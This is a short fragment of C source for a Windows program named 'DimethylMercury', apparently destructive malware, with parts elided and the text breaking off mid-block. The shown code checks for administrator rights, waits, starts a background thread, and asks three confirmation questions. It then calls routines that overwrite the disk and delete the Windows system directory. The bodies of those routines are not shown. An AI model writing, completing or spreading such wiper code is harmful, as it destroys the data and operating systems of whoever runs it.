...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	...
	if (IsElevated()) {
		if(!IsFirstRun()) {
			...
			Sleep(20000);
			CreateThread(0, 0, onceinabluemoon, 0, 0, 0);
			if (MessageBoxA(NULL, "Do You Seriously Want To Destroy Your Computer?", "DimethylMercury", MB_YESNO | MB_ICONQUESTION) == IDYES) {
				if (MessageBoxA(NULL, "Are you sure? The Creator Is Not Responsible For Any Damage!", "DimethylMercury", MB_YESNO | MB_ICONQUESTION) == IDYES) {
					if (MessageBoxA(NULL, "Dude, Are You Serious!?", "DimethylMercury", MB_YESNO | MB_ICONQUESTION) == IDYES) {
						OverWriteDisk();
						WCHAR SystemDirectory[MAX_PATH] = { 0 };
						GetSystemDirectory(SystemDirectory, MAX_PATH);
						DestroyDirectory(SystemDirectory);
